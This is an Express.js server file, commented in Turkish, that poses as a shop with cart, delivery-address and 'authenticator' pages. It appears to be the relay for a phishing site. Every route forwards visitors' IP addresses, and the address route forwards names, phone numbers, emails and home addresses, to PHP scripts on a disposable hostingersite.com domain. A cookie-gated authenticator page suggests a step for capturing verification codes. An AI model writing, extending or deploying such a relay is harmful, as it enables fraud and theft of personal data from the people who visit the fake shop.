const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
const qs = require('querystring');
require('dotenv').config();

const app = express();
app.use(cookieParser());
app.use(requestIp.mw());
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());

const getClientIp = (req) => {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  return req.connection.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
};

app.get('/', async (req, res) => {
  try {
    const clientIp = req.clientIp || getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/index.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/sepet', async (req, res) => {
  try {
    const clientIp = req.clientIp || getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/sepet.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/adres', async (req, res) => {
  try {
    const clientIp = req.clientIp || getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/adres.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.post('/veri', async (req, res) => {
  try {
    // Ziyaretçi IP'sini al
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // PHP sunucuya yönlendir
    const response = await axios.post(`https://forestgreen-rook-759809.hostingersite.com/dmn/veri.php?ip=${clientIp}`);

    // PHP cevabını geri döndür
    res.send(response.data);
  } catch (error) {
    console.error('PHP sunucusuna bağlanılamadı:', error.message);
    res.status(500).send('sunucu_hatasi');
  }
});



app.post('/api/sepet/ekle', (req, res) => {
  const urun_id = req.body.urun_id;

  const getClientIp = (req) => {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
      return forwarded.split(',')[0].trim();
    }
    return req.connection.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
  };

  const clientIp = getClientIp(req);

  axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php',
    qs.stringify({
      action: 'sepet_ekle',
      urun_id,
      ip: clientIp
    }), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  ).then(response => {
    res.json({ status: response.data.trim() });
  }).catch(error => {
    console.error(error);
    res.json({ status: 'fail' });
  });
});

app.post('/api/sepet/sil', (req, res) => {
  const urun_id = req.body.urun_id;
  const ip = getClientIp(req);

  axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=sepet_sil',
  qs.stringify({
    urun_id,
    ip
  }), {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest'
    }
  }
).then(response => {
    res.json({ status: response.data.trim() });
  }).catch(error => {
    console.error(error);
    res.json({ status: 'fail' });
  });
});

app.post('/api/adres', (req, res) => {
  const ip = getClientIp(req);

  const data = {
    addressType: req.body.addressType || 'CONSUMER',
    isDelivery: req.body.isDelivery || 'true',
    addressClass: req.body.addressClass,
    cityCode: req.body.cityCode,
    townCode: req.body.townCode,
    districtCode: req.body.districtCode,
    boulevard: req.body.boulevard,
    building: req.body.building,
    floor: req.body.floor,
    appartment: req.body.appartment,
    streetname: req.body.streetname,
    firstName: req.body.firstName,
    lastName: req.body.lastName,
    mobilePhoneNumber: req.body.mobilePhoneNumber,
    email: req.body.email,
    ip: ip
  };

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=adres',
    qs.stringify(data),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
  .then(response => {
    res.json({ status: 'ok', redirect: '/adres' });
  })
  .catch(error => {
    console.error('Adres gönderme hatası:', error.message);
    res.status(500).json({ status: 'fail' });
  });
});


app.post('/api/adres/sil', (req, res) => {
  const ip_adresi = req.body.ip_adresi || getClientIp(req);

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=adressil',
    qs.stringify({ ip: ip_adresi }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
    .then(response => {
      const trimmed = response.data.trim();
      if (trimmed === 'success') {
        res.json({ success: true });
      } else {
        res.json({ success: false, message: 'Silme başarısız: ' + trimmed });
      }
    })
    .catch(err => {
      console.error('Adres silme hatası:', err.message);
      res.status(500).json({ success: false, message: 'Sunucu hatası oluştu.' });
    });
});

app.get('/authenticator', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'authenticator.html'));
   });
 
 
 

  

app.listen(port, () => {
    console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
